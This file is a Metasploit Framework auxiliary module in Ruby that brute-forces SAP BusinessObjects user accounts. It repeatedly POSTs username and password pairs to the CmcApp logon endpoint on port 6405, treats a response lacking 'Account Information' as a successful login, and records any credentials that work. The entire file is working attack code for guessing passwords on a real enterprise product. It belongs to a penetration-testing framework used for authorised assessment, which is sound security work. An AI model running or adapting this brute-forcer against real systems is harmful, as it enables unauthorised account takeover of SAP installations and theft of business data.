##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'		   => 'SAP BusinessObjects Web User Bruteforcer',
			'Description'	=> 'This module simply attempts to bruteforce SAP BusinessObjects users by using CmcApp.',
			'References'  =>
				[
					# General
					[ 'URL', 'http://spl0it.org/files/talks/source_barcelona10/Hacking%20SAP%20BusinessObjects.pdf' ]
				],
			'Author'		 => [ 'Joshua Abraham <jabra[at]rapid7.com>' ],
			'License'		=> MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(6405),
			], self.class)
		register_autofilter_ports([ 6405 ])
	end

	def run_host(ip)
		res = send_request_cgi({
			'uri'	 => "/PlatformServices/service/app/logon.object",
			'method'  => 'GET'
		}, 25)
		return if not res

		each_user_pass { |user, pass|
			enum_user(user,pass)
		}
	end

	def enum_user(user, pass)
		vprint_status("#{rhost}:#{rport} - Trying username:'#{user}' password: '#{pass}'")
		success = false
		data = 'isFromLogonPage=true&cms=127.0.1%3A6400'
		data << "&username=#{Rex::Text.uri_encode(user.to_s)}"
		data << "&password=#{Rex::Text.uri_encode(pass.to_s)}"
		data << '&authType=secEnterprise&backUrl=%2FApp%2Fhome.faces'
		begin
			res = send_request_cgi({
				'uri'		  => '/PlatformServices/service/app/logon.object',
				'data'		 => data,
				'method'	   => 'POST',
				'headers'	  =>
							{
								'Connection' => "keep-alive",
								'Accept-Encoding' => "gzip,deflate",
							},
			}, 45)
			return :abort if (!res or (res and res.code != 200))
			if(res.body.match(/Account Information/i))
				success = false
			else
				success = true
				success
			end

		rescue ::Rex::ConnectionError
			vprint_error("[SAP BusinessObjects] Unable to attempt authentication")
			return :abort
		end

		if success
			print_good("[SAP BusinessObjects] Successful login '#{user}' password: '#{pass}'")
			report_auth_info(
				:host   => rhost,
				:proto => 'tcp',
				:sname  => 'sap-businessobjects',
				:user   => user,
				:pass   => pass,
				:target_host => rhost,
				:target_port => rport
			)
			return :next_user
		else
			vprint_error("[SAP BusinessObjects] failed to login as '#{user}' password: '#{pass}'")
			return
		end
	end
end
